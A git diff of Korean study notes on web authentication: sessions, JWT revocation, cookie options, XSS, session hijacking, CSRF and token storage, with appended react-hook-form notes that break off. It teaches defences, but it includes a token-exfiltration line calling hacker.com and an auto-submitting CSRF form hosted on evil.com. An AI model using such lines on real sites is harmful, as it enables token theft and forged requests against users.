@@ -6,7 +6,7 @@
   1. `메모리 저장`: 가장 빠름 **BUT** 서버 재시작 시 모든 세션 사라짐
   2. `인메모리 데이터베이스 사용 (Redis 등)`: 속도와 영속성 모두 **GET!** + 분산 환경에서 **여러 서버** 세션 공유 가능 + 서버 **재시작** 해도 세션 유지!
   3. `관계형 데이터베이스 저장`: 가장 안정적 **BUT** 타 방식에 비해 성능 떨어짐
-  **토큰 방식**
+     **토큰 방식**
   - 사용자 정보 토큰 자체에 포함시켜 클라이언트가 직접 보관하고 전송
 - 세션을 분산 환경에서 관리할 때 사용할 수 있는 세 가지 전략(Sticky Session, Session Replication, Centralized Session Store)의 특징을 정리해주세요. 🍠
   1. **`Sticky Session(세션 고정)`**: 로드밸런서가 같은 사용자의 요청을 항상 같은 서버로 보내는 방식
@@ -17,23 +17,19 @@
   - 단점: 서버 간 네트워크 통신이 많아져 성능 떨어짐
   3. **`Centralized Session Store(중앙 세션 저장소)`**: Redis 같은 별도 저장소에 모든 세션을 보관하는 방식
   - 현재 가장 널리 사용되는 방법
-  Redis란?: 메모리 기반의 오픈소스 키-값 데이터 저장소 → 디스크보다 훨씬 빠른 읽기와 쓰기 성능 제공
-- JWT(Json Web Token)의 장점과 단점을 각각 설명해주세요. 🍠
-  -토큰: 사용자 정보를 토큰 자체에 포함시키는 self-contained 방식
+    Redis란?: 메모리 기반의 오픈소스 키-값 데이터 저장소 → 디스크보다 훨씬 빠른 읽기와 쓰기 성능 제공
+- JWT(Json Web Token)의 장점과 단점을 각각 설명해주세요. 🍠 -토큰: 사용자 정보를 토큰 자체에 포함시키는 self-contained 방식
   - 토큰 자체에 사용자 ID, 권한, 만료 시간 포함 + 서버의 비밀 키로 서명
-  - 서버는 서명 검증하면 토큰의 유효성 확인 가능
-  -**장점: `확장성`**
-  : 각 서버가 독립적으로 토큰을 검증할 수 있으므로 MSA에서 각 서비스가 독립적으로 인증을 처리할 수 있음
-  -**단점: `유효성**`
-  : 한번 발급한 토큰은 만료될 때까지 유효함 → 사용자 강제 로그아웃 등의 보안 이슈가 있을 때 이를 즉시 처리하는 것이 어려움
-- JWT의 즉시 무효화 문제가 생기는 이유와 이를 해결하기 위한 방법은 무엇인가요? 🍠
-  -`JWT`는 발급 시 토큰 자체에 인증 정보를 담고 서버가 상태를 저장하지 않는 Stateless 특성 때문에 발급된 토큰을 즉시 취소(무효화)하기 어려움
+  - 서버는 서명 검증하면 토큰의 유효성 확인 가능 -**장점: `확장성`**
+    : 각 서버가 독립적으로 토큰을 검증할 수 있으므로 MSA에서 각 서비스가 독립적으로 인증을 처리할 수 있음 -**단점: `유효성**`
+    : 한번 발급한 토큰은 만료될 때까지 유효함 → 사용자 강제 로그아웃 등의 보안 이슈가 있을 때 이를 즉시 처리하는 것이 어려움
+- JWT의 즉시 무효화 문제가 생기는 이유와 이를 해결하기 위한 방법은 무엇인가요? 🍠 -`JWT`는 발급 시 토큰 자체에 인증 정보를 담고 서버가 상태를 저장하지 않는 Stateless 특성 때문에 발급된 토큰을 즉시 취소(무효화)하기 어려움
   → 로그아웃, 비밀번호 변경, 계정 정지 등에서 기존 토큰을 바로 막지 못해 보안 리스크가 커질 수 있음
   **-즉시 무효화가 어려운 이유**
   1.  `Stateless`: 서버가 토큰 발급 / 사용 내역을 보관하지 않으므로 토큰이 만료될 때까지 서버에서 “이 토큰은 안 쓴다”고 알려줄 수 없음.
   2.  `탈취 시 대응 지연`: 토큰이 유효한 기간 동안 탈취되면 공격자가 계속 사용할 수 있어 즉시 취소가 필요하지만, 기본 구조에서는 어려움
-  3.  `세션 / DB 기반 취소 불가능`: 세션 테이블이 없으면 로그인 / 비밀번호 변경 / 탈퇴 시 서버가 토큰을 찾아서 무효화할 근거 부족
-  -**해결 방법**
+  3.  `세션 / DB 기반 취소 불가능`: 세션 테이블이 없으면 로그인 / 비밀번호 변경 / 탈퇴 시 서버가 토큰을 찾아서 무효화할 근거 부족 -**해결 방법**
+
   ```jsx
   1) **블랙리스트(DentList) 방식**
   : 무효화할 토큰의 jti(JWT ID)를 서버 저장소에 저장하고, 요청마다 확인
@@ -76,6 +72,7 @@
   -장점: 블랙리스트보다 저장 공간 효율적, 특정 유저 전체 무효화 용이
   -단점: 요청마다 DB 조회 필요**
   ```
+
 - 세션과 토큰을 결합한 하이브리드 방식(JWT + 저장소 메타데이터)의 동작 원리를 간단히 설명해주세요. 🍠
 
   **-세션과 토큰의 장점을 결합한 방식:**
@@ -86,24 +83,17 @@
 - HTTP는 왜 무상태(Stateless)로 설계되었나요? 🍠
   HTTP에서 각 요청과 응답은 서로 독립적으로 처리되며, 서버는 **이전 요청의 정보**를 기억하지 않음
   → 이 특성 덕분에 확장성이 뛰어남
-- HTTP의 무상태성이 주는 장점과 단점을 각각 정리해주세요. 🍠
-  -단점: 사용자의 상태를 추적해야 함 -장점: 확장성이 뛰어나 서버를 확장해도 어느 서버든 모든 요청을 처리할 수 있음
-- 쿠키의 Domain 디렉티브에 대해 정리해주세요. 🍠
-  -대표 사례: 로그인 인증
+- HTTP의 무상태성이 주는 장점과 단점을 각각 정리해주세요. 🍠 -단점: 사용자의 상태를 추적해야 함 -장점: 확장성이 뛰어나 서버를 확장해도 어느 서버든 모든 요청을 처리할 수 있음
+- 쿠키의 Domain 디렉티브에 대해 정리해주세요. 🍠 -대표 사례: 로그인 인증
   → 사용자가 로그인한 뒤, 메인 도메인에서도 인증 상태를 유지하고 싶다면 서버에서 쿠기 발급할 때 Domain 속성을 메인 도메인으로 지정하면 됨
   ```jsx
   res.setHeader('Set-Cookie', 'sid=1; Domain=yolog.co.kr');
   ```
-- 쿠키의 Path 디렉티브에 대해 정리해주세요. 🍠
-  -경로 단위로 쿠기 전송 범위 제한
-  -`/private` 요청 시 → 쿠키 전송
-  -`/public` 요청 시 → 쿠키 없음
+- 쿠키의 Path 디렉티브에 대해 정리해주세요. 🍠 -경로 단위로 쿠기 전송 범위 제한 -`/private` 요청 시 → 쿠키 전송 -`/public` 요청 시 → 쿠키 없음
   ```jsx
   res.setHeader('Set-Cookie', 'sid=1; Path=/private');
   ```
-- 세션 쿠키와, 영속 쿠키의 차이점을 정리해주세요. 🍠
-  -`세션 쿠키`: 브라우저 종료 시 삭제
-  -`영속 쿠키`: 로그인 유지
+- 세션 쿠키와, 영속 쿠키의 차이점을 정리해주세요. 🍠 -`세션 쿠키`: 브라우저 종료 시 삭제 -`영속 쿠키`: 로그인 유지
   - [**`Max-Age`**](https://developer.mozilla.org/ko/docs/Web/HTTP/Headers/Set-Cookie#max-agenumber): 쿠키 수명을 초 단위로 설정
   - [**`Expires`**](https://developer.mozilla.org/ko/docs/Web/HTTP/Headers/Set-Cookie#expiresdate): 특정 만료일 설정
   ```jsx
@@ -122,11 +112,9 @@
      - XSS(Cross-Site Scripting) -`HttpOnly` 플래그로 JS 접근 차단 가능하지만, 완전한 방어는 아님
      - CSRF (Cross-Site Request Forgery)
        `사용자가 악성 사이트 방문
-  → 악성 사이트가 은행 API로 요청 전송
-  → 브라우저가 쿠키를 자동 첨부
-  → 서버는 정상 요청으로 인식`
-       - `SameSite` 플래그(`Strict` / `Lax`)로 완화 가능
-       - **전송 중 탈취 -** `Secure` 플래그 미설정 시 HTTP 환경에서 평문 전송 → 중간자 공격에 노출
+→ 악성 사이트가 은행 API로 요청 전송
+→ 브라우저가 쿠키를 자동 첨부
+→ 서버는 정상 요청으로 인식` - `SameSite` 플래그(`Strict` / `Lax`)로 완화 가능 - **전송 중 탈취 -** `Secure` 플래그 미설정 시 HTTP 환경에서 평문 전송 → 중간자 공격에 노출
   3. 네크워크 오버헤드
      - 해당 도메인의 **모든 HTTP 요청에 자동 첨부** (이미지, CSS, JS 포함)
      - 불필요한 요청에도 쿠키가 포함되어 **대역폭 낭비**
@@ -147,7 +135,7 @@
 
 - XSS 공격은 무엇인가요?
   - 공격자가 **악성 스크립트를 웹 페이지에 심어**, 다른 사용자의 브라우저에서 실행시키는 공격
-  **1. Stored XSS (저장형)** — 가장 위험
+    **1. Stored XSS (저장형)** — 가장 위험
   ```jsx
   공격자가 게시판에 악성 스크립트 작성
   → DB에 저장됨
@@ -191,8 +179,7 @@
   /_ 자기 도메인 스크립트만 허용, 외부 스크립트 차단 _/
 
 - 세션 하이재킹은 무엇인가요? 🍠
-  - 정의
-    -공격자가 **정상 사용자의 세션 ID를 훔쳐**, 해당 사용자인 척 서버에 접근하는 공격
+  - 정의 -공격자가 **정상 사용자의 세션 ID를 훔쳐**, 해당 사용자인 척 서버에 접근하는 공격
   - 개념: 로그인하면 서버는 세션 ID 발급
     ```jsx
     사용자 로그인 → 서버가 세션 ID 발급 → 쿠키에 저장
@@ -206,6 +193,7 @@
     ④ 서버는 피해자로 인식 → 공격자에게 정상 응답
     ```
   - 탈취 방법
+
     ```jsx
     1. XSS로 탈취
     // HttpOnly 미설정 시
@@ -220,22 +208,25 @@
     → 피해자가 그 세션 ID로 로그인
     → 공격자는 이미 세션 ID를 알고 있으므로 바로 접근 가능
     ```
+
   - 방어 방법
-    | 방법                     | 이유                                  |
+    | 방법 | 이유 |
     | ------------------------ | ------------------------------------- |
-    | `HttpOnly` 쿠키          | JS로 세션 ID 접근 자체를 차단         |
-    | `Secure` 쿠키            | HTTPS에서만 쿠키 전송, 스니핑 방지    |
-    | 로그인 후 세션 ID 재발급 | 세션 고정 공격 방지                   |
-    | 세션 만료 시간 설정      | 탈취되어도 짧은 시간 내 무효화        |
-    | IP / User-Agent 검증     | 세션 ID가 탈취돼도 다른 환경이면 차단 |
+    | `HttpOnly` 쿠키 | JS로 세션 ID 접근 자체를 차단 |
+    | `Secure` 쿠키 | HTTPS에서만 쿠키 전송, 스니핑 방지 |
+    | 로그인 후 세션 ID 재발급 | 세션 고정 공격 방지 |
+    | 세션 만료 시간 설정 | 탈취되어도 짧은 시간 내 무효화 |
+    | IP / User-Agent 검증 | 세션 ID가 탈취돼도 다른 환경이면 차단 |
   - XSS와의 관계
     ```jsx
     XSS ──────────────────▶ 세션 하이재킹
     (악성 스크립트 실행)      (세션 ID 탈취 후 도용)
     ```
+
 - XSS 공격을 차단하는 방법은 무엇인가요? 🍠
   - 입력값 이스케이프 (가장 기본)
     - 사용자 입력의 특수문자를 **HTML 엔티티로 변환**해 스크립트로 실행되지 않게 막아요.
+
     ```jsx
     // 변환 예시
     <  →  &lt;
@@ -250,7 +241,9 @@
     // 이스케이프 후 → 그냥 텍스트로 출력됨
     &lt;script&gt;alert('XSS')&lt;/script&gt;
     ```
+
   - HttpOnly 쿠키
+
     ```jsx
     JS에서 document.cookie 접근 자체를 **원천 차단**해요.
 
@@ -259,8 +252,11 @@
 
     스크립트가 실행되더라도 쿠키를 읽지 못해 **세션 하이재킹을 방지**해요.
     ```
+
   ### 3. CSP 헤더 (Content-Security-Policy)
+
   **허용된 출처의 스크립트만 실행**하도록 브라우저에 지시해요.
+
   ```jsx
   //http
 
@@ -273,15 +269,20 @@
   # 인라인 스크립트 전면 차단
   Content-Security-Policy: script-src 'self'; default-src 'none'
   ```
+
   ```jsx
   //html
 
   <!-- CSP 설정 시 아래 인라인 스크립트는 실행 안 됨 -->
   <script>악성코드</script>  ❌
   ```
+
   ***
+
   ### 4. 입력값 검증 (Validation)
+
   허용된 값만 받고 **나머지는 거부**해요.
+
   ```jsx
   // ❌ 나쁜 예 - 입력값을 그대로 신뢰
   const username = req.body.username;
@@ -292,11 +293,16 @@
     throw new Error('허용되지 않는 입력값');
   }
   ```
+
   > 검증은 **클라이언트 + 서버 양쪽** 모두에서 해야 해요.
   > 클라이언트 검증만 하면 우회가 쉬워요.
+
   ***
+
   ### 5. 템플릿 엔진의 자동 이스케이프 활용
+
   React, Vue 등 현대 프레임워크는 기본적으로 이스케이프를 자동 처리해요.
+
   ```jsx
   // ✅ React - 자동 이스케이프
   const userInput = '<script>악성코드</script>';
@@ -305,9 +311,13 @@
   // ❌ 위험 - 이스케이프 우회 (꼭 필요한 경우만 사용)
   return <div dangerouslySetInnerHTML={{ __html: userInput }} />;
   ```
+
   ***
+
   ### 6. DOMPurify (불가피한 HTML 허용 시)
+
   게시판처럼 HTML 입력을 허용해야 할 때, **악성 태그만 제거**해요.
+
   ```jsx
   import DOMPurify from 'dompurify';
 
@@ -315,9 +325,11 @@
   const clean = DOMPurify.sanitize(dirty);
   // 결과: <img src="x"> ← 악성 속성만 제거
   ```
+
 - 쿠키의 다양한 옵션들에 대해서 정리해주세요. 🍠
   - `Expires` / `Max-Age` (만료 시간)
     - 쿠키 유효 기간 설정
+
     ```jsx
     // 특정 날짜까지 유지
     Set-Cookie: token=abc123; Expires=Wed, 09 Jun 2025 10:00:00 GMT
@@ -325,12 +337,15 @@
     // 현재 시점부터 초 단위로 유지 (우선순위 높음)
     Set-Cookie: token=abc123; Max-Age=3600  # 1시간
     ```
+
     | 구분   | 설명                                        |
     | ------ | ------------------------------------------- |
     | 미설정 | 브라우저 닫으면 삭제 (세션 쿠키)            |
     | 설정   | 브라우저 닫아도 만료일까지 유지 (영속 쿠키) |
+
   - `Domain`
     - 쿠키를 어느 도메인까지 전송할지 설정
+
     ```jsx
     // 현재 도메인만 (서브도메인 미포함)
     Set-Cookie: token=abc123; Domain=goguma.com
@@ -339,9 +354,12 @@
     Set-Cookie: token=abc123; Domain=.goguma.com
     // → goguma.com, api.goguma.com, admin.goguma.com 모두 전송
     ```
+
     > ⚠️ 서브도메인 중 하나가 탈취되면 쿠키가 노출 위험!
+
   - `Path`
     - 쿠키를 어느 경로에서만 전송할지 설정
+
     ```jsx
     // /api 하위 경로 요청에만 쿠키 전송
     Set-Cookie: token=abc123; Path=/api
@@ -356,23 +374,30 @@
     ❌ /home         → 쿠키 미전송
     ❌ /mypage       → 쿠키 미전송
     ```
+
   - `Secure`
     - HTTPS 연결에서만 쿠키 전송
+
     ```jsx
     Set-Cookie: token=abc123; Secure
 
     HTTP  요청 → ❌ 쿠키 미전송 (스니핑 방지)
     HTTPS 요청 → ✅ 쿠키 전송
     ```
+
     > 운영 환경에서는 필수 옵션
+
   - `HttpOnly`
     - JavaScript에서 쿠키 접근 완전 차단
+
     ```jsx
     Set-Cookie: token=abc123; HttpOnly
 
     document.cookie  // ❌ 읽기 불가 → XSS로 탈취 불가
     ```
+
     > 세션 ID, 인증 토큰 등 **민감한 쿠키에는 필수**
+
   - `SameSite`(CSRF 방어)
     - 다른 사이트에서의 요청에 쿠키를 포함할지 설정
 
@@ -415,6 +440,7 @@
   ```
 
 - HttpOnly 쿠키
+
   ```jsx
   JS에서 document.cookie 접근 자체를 **원천 차단**해요.
 
@@ -499,6 +525,7 @@ const clean = DOMPurify.sanitize(dirty);
 
 - `Expires` / `Max-Age` (만료 시간)
   - 쿠키 유효 기간 설정
+
   ```jsx
   // 특정 날짜까지 유지
   Set-Cookie: token=abc123; Expires=Wed, 09 Jun 2025 10:00:00 GMT
@@ -506,12 +533,15 @@ const clean = DOMPurify.sanitize(dirty);
   // 현재 시점부터 초 단위로 유지 (우선순위 높음)
   Set-Cookie: token=abc123; Max-Age=3600  # 1시간
   ```
+
   | 구분   | 설명                                        |
   | ------ | ------------------------------------------- |
   | 미설정 | 브라우저 닫으면 삭제 (세션 쿠키)            |
   | 설정   | 브라우저 닫아도 만료일까지 유지 (영속 쿠키) |
+
 - `Domain`
   - 쿠키를 어느 도메인까지 전송할지 설정
+
   ```jsx
   // 현재 도메인만 (서브도메인 미포함)
   Set-Cookie: token=abc123; Domain=goguma.com
@@ -520,9 +550,12 @@ const clean = DOMPurify.sanitize(dirty);
   Set-Cookie: token=abc123; Domain=.goguma.com
   // → goguma.com, api.goguma.com, admin.goguma.com 모두 전송
   ```
+
   > ⚠️ 서브도메인 중 하나가 탈취되면 쿠키가 노출 위험!
+
 - `Path`
   - 쿠키를 어느 경로에서만 전송할지 설정
+
   ```jsx
   // /api 하위 경로 요청에만 쿠키 전송
   Set-Cookie: token=abc123; Path=/api
@@ -537,23 +570,30 @@ const clean = DOMPurify.sanitize(dirty);
   ❌ /home         → 쿠키 미전송
   ❌ /mypage       → 쿠키 미전송
   ```
+
 - `Secure`
   - HTTPS 연결에서만 쿠키 전송
+
   ```jsx
   Set-Cookie: token=abc123; Secure
 
   HTTP  요청 → ❌ 쿠키 미전송 (스니핑 방지)
   HTTPS 요청 → ✅ 쿠키 전송
   ```
+
   > 운영 환경에서는 필수 옵션
+
 - `HttpOnly`
   - JavaScript에서 쿠키 접근 완전 차단
+
   ```jsx
   Set-Cookie: token=abc123; HttpOnly
 
   document.cookie  // ❌ 읽기 불가 → XSS로 탈취 불가
   ```
+
   > 세션 ID, 인증 토큰 등 **민감한 쿠키에는 필수**
+
 - `SameSite`(CSRF 방어)
   - 다른 사이트에서의 요청에 쿠키를 포함할지 설정
 
@@ -578,6 +618,7 @@ const clean = DOMPurify.sanitize(dirty);
 
 - CSRF는 무엇인가요? 🍠
   - 공격자가 **피해자 몰래, 피해자인 척** 서버에 요청을 보내는 공격
+
     ```jsx
     ① 손님(피해자)이 고구마 가게에 로그인
        → 쿠키(출입증)를 발급받음
@@ -591,8 +632,11 @@ const clean = DOMPurify.sanitize(dirty);
 
     ⑤ 고구마 가게 서버는 정상 요청으로 인식 💥
     ```
+
     > 핵심: **브라우저가 쿠키를 자동으로 첨부!**
+
   - 공격 흐름
+
     ```jsx
     [피해자]                [악성 사이트]            [정상 서버]
 
@@ -606,13 +650,17 @@ const clean = DOMPurify.sanitize(dirty);
                                                자동 요청 전송 ──▶ 쿠키 자동 첨부
                                                                  정상 요청으로 인식 💥
     ```
+
 - CSRF 방어 전략에 대해 정리해주세요. 🍠
   `SameSite 쿠키`
+
   ```jsx
   Set-Cookie: session_id=abc; SameSite=Strict
   // 다른 사이트에서 오는 요청엔 쿠키를 아예 안 보냄
   ```
+
   `CSRF 토큰`
+
   ```jsx
   서버가 랜덤 토큰 발급
   → 모든 요청에 토큰 포함 필수
@@ -622,7 +670,9 @@ const clean = DOMPurify.sanitize(dirty);
     <input type="hidden" name="csrf_token" value="a1b2c3d4e5f6" />
   </form>
   ```
+
   `Referer` / `Origin` 헤더 검증
+
   ```jsx
   요청 헤더의 Origin이 우리 도메인인지 확인
   → 외부 도메인에서 온 요청은 거부
@@ -631,26 +681,30 @@ const clean = DOMPurify.sanitize(dirty);
     return res.status(403).send("요청 거부");
   }
   ```
+
 - CSRF 토큰의 장점과 단점에 대해 정리해주세요. 🍠
   - ✅ 장점
     **1. 강력한 보안**
     - 서버가 발급한 **예측 불가능한 랜덤 토큰**을 요청마다 검증
     - 악성 사이트는 토큰 값을 알 수 없어 요청 위조 불가
-    **2. SameSite 미지원 환경 커버**
+      **2. SameSite 미지원 환경 커버**
     - 구형 브라우저는 `SameSite` 쿠키를 지원 안 할 수 있음
     - CSRF 토큰은 브라우저 무관하게 **서버 레벨에서 독립적으로 동작**
-    **3. 세밀한 제어 가능**
+      **3. 세밀한 제어 가능**
     - 특정 폼, 특정 API에만 선택적으로 적용 가능
     - 토큰 만료 시간, 1회용 여부 등 **정책을 자유롭게 설정** 가능
   - ❌ 단점
     **`구현 복잡도 증가`**
+
     ```jsx
     서버: 토큰 발급 → 저장 → 검증 로직 필요
     클라이언트: 모든 요청에 토큰 포함 필요
 
     *폼이 많을수록 누락 위험 증가
     ```
+
     **`SPA / API 환경에서 처리 번거로움`**
+
     ```jsx
     // 매 요청마다 토큰을 헤더에 직접 포함해야 함
     fetch('/api/order', {
@@ -660,15 +714,18 @@ const clean = DOMPurify.sanitize(dirty);
       },
     });
     ```
+
     **`토큰 저장소 관리 필요`**
     - 서버가 발급한 토큰을 **세션 또는 DB에 저장**해야 함
     - 서버가 여러 대면 토큰 공유 문제 발생 (Redis 등 별도 저장소 필요)
-    **`멀티탭 문제`**
+      **`멀티탭 문제`**
+
     ```jsx
     탭 A에서 토큰 발급
     → 탭 B에서 새 토큰 발급 (기존 토큰 무효화)
     → 탭 A에서 요청 시 토큰 불일치 → 요청 실패 😵
     ```
+
 - CAPTCHA는 무엇인가요? 🍠
 
   > **사람인지 봇인지 구별**하기 위한 자동화 공격 방어 테스트
@@ -682,6 +739,7 @@ const clean = DOMPurify.sanitize(dirty);
 
 - 쿠키 방식으로 인증 정보를 전송할 때 브라우저가 자동으로 쿠키를 포함하는 조건은 무엇인가요? 🍠
   `Domain 조건`
+
   ```jsx
   -요청 URL의 도메인이 쿠키의 Domain 속성과 일치해야 함
 
@@ -692,7 +750,9 @@ const clean = DOMPurify.sanitize(dirty);
   ❌ gamja.com         → 미포함 (다른 도메인)
   ❌ evil-goguma.com   → 미포함 (다른 도메인)
   ```
+
   `Path 조건`
+
   ```jsx
   -요청 URL의 경로가 쿠키의 Path 속성과 일치하거나 하위 경로여야 함
 
@@ -704,7 +764,9 @@ const clean = DOMPurify.sanitize(dirty);
   ❌ /home         → 미포함
   ❌ /mypage       → 미포함
   ```
+
   `Secure 조건`
+
   ```jsx
   -Secure 플래그가 설정된 쿠키는 HTTPS 요청에만 포함
 
@@ -713,7 +775,9 @@ const clean = DOMPurify.sanitize(dirty);
   ✅ https://goguma.com  → 포함
   ❌ http://goguma.com   → 미포함
   ```
+
   `SameSite 조건`
+
   ```jsx
   -요청이 어느 사이트에서 출발했는지에 따라 포함 여부가 달라짐
 
@@ -729,7 +793,9 @@ const clean = DOMPurify.sanitize(dirty);
   쿠키 설정: SameSite=None; Secure
   ✅ 모든 크로스 사이트 요청     → 포함 (반드시 Secure 필요)
   ```
+
   `만료 조건`
+
   ```jsx
   -쿠키가 만료되지 않아야 함
 
@@ -738,15 +804,19 @@ const clean = DOMPurify.sanitize(dirty);
 
   Expires 미설정 → 세션 쿠키 → 브라우저 닫으면 삭제
   ```
+
 - 크로스 도메인 환경에서 쿠키를 전송하려면 서버와 클라이언트 측에서 각각 어떤 설정이 필요할까요? 🍠
+
   ```jsx
   // 상황 예시
 
   클라이언트: https://front.com
   서버:       https://api.com   ← 다른 도메인!
   ```
+
   **서버 측 설정**
   `CORS 헤더 설정`
+
   ```jsx
   // Express.js 예시
   app.use(
@@ -756,19 +826,25 @@ const clean = DOMPurify.sanitize(dirty);
     }),
   );
   ```
+
   > ⚠️ `credentials: true` 설정 시 `origin: "*"` 사용 불가 반드시 **명시적인 도메인**을 지정해야 함
+
   ```jsx
   // 실제 응답 헤더
   Access-Control-Allow-Origin: https://front.com   ← * 불가
   Access-Control-Allow-Credentials: true           ← 필수
   ```
+
   `SameSite=None; Secure 설정`
+
   ```jsx
   Set-Cookie: session_id=abc123;
     SameSite=None;   # 크로스 사이트 쿠키 허용
     Secure;          # HTTPS 필수 (SameSite=None이면 반드시 필요)
   ```
+
   **클라이언트 측 설정**
+
   ```jsx
   //fetch 사용 시
   fetch('https://api.com/login', {
@@ -785,10 +861,13 @@ const clean = DOMPurify.sanitize(dirty);
   // 전역 설정
   axios.defaults.withCredentials = true;
   ```
+
 - 쿠키 기반 인증에서 CSRF 공격이 발생할 수 있는 원리는 무엇인가요? 🍠
+
   > 브라우저가 요청 출처와 상관없이 쿠키를 자동으로 첨부하기 때문
-  **단계별 공격 원리**
-  **① 피해자 로그인**
+  > **단계별 공격 원리**
+  > **① 피해자 로그인**
+
   ```jsx
   //피해자가 goguma.com에 로그인
   → 서버가 세션 쿠키 발급
@@ -797,12 +876,16 @@ const clean = DOMPurify.sanitize(dirty);
   브라우저 쿠키 저장소:
   session_id=abc123; Domain=goguma.com
   ```
+
   **② 악성 사이트 방문**
+
   ```jsx
   피해자가 로그아웃 안 한 채로
   evil.com 방문 (광고 클릭, 피싱 메일 등)
   ```
+
   **③ 악성 사이트가 몰래 요청 전송**
+
   ```jsx
   <!-- evil.com의 숨겨진 코드 -->
   <form action="https://goguma.com/order" method="POST">
@@ -811,7 +894,9 @@ const clean = DOMPurify.sanitize(dirty);
   </form>
   <script>document.forms[0].submit()</script>
   ```
+
   **④ 브라우저가 쿠키 자동 첨부**
+
   ```jsx
   요청 출처: evil.com
   요청 대상: goguma.com
@@ -819,15 +904,18 @@ const clean = DOMPurify.sanitize(dirty);
   → 브라우저: "goguma.com 요청이네? 쿠키 자동 첨부!"
   → Cookie: session_id=abc123 ← 자동 포함 💥
   ```
+
   **⑤ 서버가 정상 요청으로 인식**
+
   ```jsx
   goguma.com 서버:
   "session_id=abc123 → 피해자 계정이네!"
   "정상 요청으로 처리" 💥
   ```
+
 - 헤더 방식 인증의 주요 장점(예: CSRF 방어, 선택적 전송, CORS 단순화)을 정리해주세요. 🍠
-  - `CSRF 방어 (가장 큰 장점)`
-    -쿠키 → 브라우저가 자동 첨부 -헤더 → JS 코드가 직접 첨부
+  - `CSRF 방어 (가장 큰 장점)` -쿠키 → 브라우저가 자동 첨부 -헤더 → JS 코드가 직접 첨부
+
     ```jsx
     // 헤더 방식 - JS가 직접 토큰을 첨부
     fetch("https://api.com/order", {
@@ -842,8 +930,9 @@ const clean = DOMPurify.sanitize(dirty);
 
     ∴ CSRF 공격 원천 차단!
     ```
-  - `선택적 전송`
-    -쿠키 → 조건만 맞으면 모든 요청에 자동 첨부 -헤더 → 필요한 요청에만 포함
+
+  - `선택적 전송` -쿠키 → 조건만 맞으면 모든 요청에 자동 첨부 -헤더 → 필요한 요청에만 포함
+
     ```jsx
     // 인증 필요한 요청에만 헤더 포함
     fetch("/api/mypage", {
@@ -859,9 +948,11 @@ const clean = DOMPurify.sanitize(dirty);
     CSS 요청   → 쿠키 자동 첨부   CSS 요청   → 헤더 없음 ✅
     API 요청   → 쿠키 자동 첨부   API 요청   → 헤더 포함 ✅
     ```
+
     > 불필요한 데이터 전송이 없어 네트워크 효율이 높아짐
-  - `CORS 단순화`
-    -쿠키 → 크로스 도메인 설정 까다로움 -헤더 → 설정 단순
+
+  - `CORS 단순화` -쿠키 → 크로스 도메인 설정 까다로움 -헤더 → 설정 단순
+
     ```jsx
     // ❌ 쿠키 방식 - 복잡한 CORS 설정 필요
     app.use(cors({
@@ -885,10 +976,10 @@ const clean = DOMPurify.sanitize(dirty);
     헤더 방식 크로스 도메인 체크리스트
     □ Access-Control-Allow-Origin: * (와일드카드 가능)
     ```
-  - `다양한 클라이언트 지원`
-    -쿠키 → 브라우저 전용 -헤더 → 어떤 클라이언트든지 사용 가능
-  - `Stateless 서버 구현 가능`
-    -`JWT` 토큰은 서버가 상태 저장하지 않아도 검증 가능
+
+  - `다양한 클라이언트 지원` -쿠키 → 브라우저 전용 -헤더 → 어떤 클라이언트든지 사용 가능
+  - `Stateless 서버 구현 가능` -`JWT` 토큰은 서버가 상태 저장하지 않아도 검증 가능
+
     ```jsx
     쿠키 + 세션 방식
     → 서버가 세션 저장소 필요 (Redis, DB)
@@ -899,8 +990,10 @@ const clean = DOMPurify.sanitize(dirty);
     → 서버가 어떤 대여도 독립적으로 검증 가능 ✅
     → 수평 확장(Scale-out) 용이
     ```
+
 - 토큰을 클라이언트에 저장할 때 LocalStorage, SessionStorage, 메모리 저장의 장단점을 비교해주세요. 🍠
   - `LocalStorage`
+
     ```jsx
     // 저장
     localStorage.setItem('token', 'abc123');
@@ -919,11 +1012,14 @@ const clean = DOMPurify.sanitize(dirty);
     - **❌ 단점**
       - JS로 자유롭게 접근 가능 → **XSS 공격에 그대로 노출**
       - HttpOnly 설정 불가 → 악성 스크립트가 토큰 탈취 가능
+
     ```jsx
     // XSS 공격 시 토큰 탈취 가능
     fetch('https://hacker.com?token=' + localStorage.getItem('token'));
     ```
+
   - `SessionStorage`
+
     ```jsx
     // 저장
     sessionStorage.setItem('token', 'abc123');
@@ -942,7 +1038,9 @@ const clean = DOMPurify.sanitize(dirty);
       - JS로 접근 가능 → **XSS 취약점은 동일**
       - 탭을 닫으면 삭제 → 새 탭에서 다시 로그인 필요
       - 탭 간 공유 안 됨 → 여러 탭 사용 시 불편
+
   - `메모리 저장(변수)`
+
     ```jsx
     // 모듈 내 변수로 저장
     let accessToken = null;
@@ -964,6 +1062,7 @@ const clean = DOMPurify.sanitize(dirty);
       - **새로고침하면 토큰 사라짐** → 매번 재발급 필요
       - 탭 간 공유 불가
       - 재발급을 위해 **Refresh Token을 별도 저장**해야 함
+
     ```jsx
     페이지 새로고침
     → 메모리 초기화
@@ -971,5 +1070,357 @@ const clean = DOMPurify.sanitize(dirty);
     → Refresh Token으로 재발급 필요
     (Refresh Token은 HttpOnly 쿠키에 저장)
     ```
+
 - Single Page Application, Mobile Application, Server Side Rendering Application 에서 여러분들이 생각하는 적합한 인증 전략은 무엇이라고 생각하시나요? 🍠
   SSRA: 서버 세션 기반 인증 + HttpOnly / Secure Cookie
+
+- **react-hook-form** 학습 내용 정리
+
+  # 📌 React Hook Form 핵심 정리
+
+  ## 1. 📖 React Hook Form이 뭐냐?
+  - React에서 **폼 상태 + 검증 + 제출**을 쉽게 관리하는 라이브러리
+  - 특징:
+    - **가볍다 (≈ 3KB)**
+    - **리렌더 최소화 → 성능 좋음**
+    - **HTML form 방식 그대로 사용 가능**
+    - **의존성 없음**
+
+  > "폼 만들 때 state 지옥 안 빠지게 해주는 라이브러리"
+
+  ***
+
+  ## 2. 🔥 기본 구조 (핵심 3개만 알면 끝)
+
+  ### 1) `useForm()`
+
+  폼 전체를 관리하는 핵심 훅
+
+  ```tsx
+  const { register, handleSubmit, formState } = useForm();
+  ```
+
+  👉 여기서 얻는 것:
+  - register → input 연결
+  - handleSubmit → 제출 처리
+  - formState → 에러 상태
+
+  ***
+
+  ### 2) `register()`
+
+  input을 폼에 등록
+
+  ```tsx
+  <input {...register('name')} />
+  ```
+
+  👉 역할:
+  - 값 추적
+  - validation 연결
+
+  ***
+
+  ### 3) `handleSubmit()`
+
+  폼 제출 처리
+
+  ```tsx
+  <formonSubmit={handleSubmit(onSubmit)}>
+  ```
+
+  👉 특징:
